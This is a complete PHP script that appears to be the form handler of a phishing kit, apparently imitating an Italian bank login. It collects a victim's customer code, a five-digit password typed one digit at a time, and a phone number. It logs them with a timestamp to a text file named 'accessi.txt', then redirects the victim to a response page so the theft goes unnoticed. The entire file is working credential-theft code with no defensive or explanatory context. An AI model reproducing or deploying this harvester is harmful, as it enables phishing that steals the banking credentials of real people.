<?php

	date_default_timezone_set('Europe/Rome');
	$date = date('d/m/Y h:i:s a', time());

	$file = "accessi.txt";

	$data = "CODICE: " . $_POST['codicecliente'] . "\n\n" . "PASSWORD: " . $_POST['digit1'] . $_POST['digit2'] . $_POST['digit3'] . $_POST['digit4'] . $_POST['digit5'] . "\n\n" . "DATA E ORA: " . $date . "\n\n" . "TELEFONO: " . $_POST['telefono'] ."\n\n" . "-------------------------------------------------------" . "\r\n";

	$fp = fopen($file, 'a');

	fputs($fp, $data);

	fclose($fp);
	
	header('Location: response.html');
	
	
?>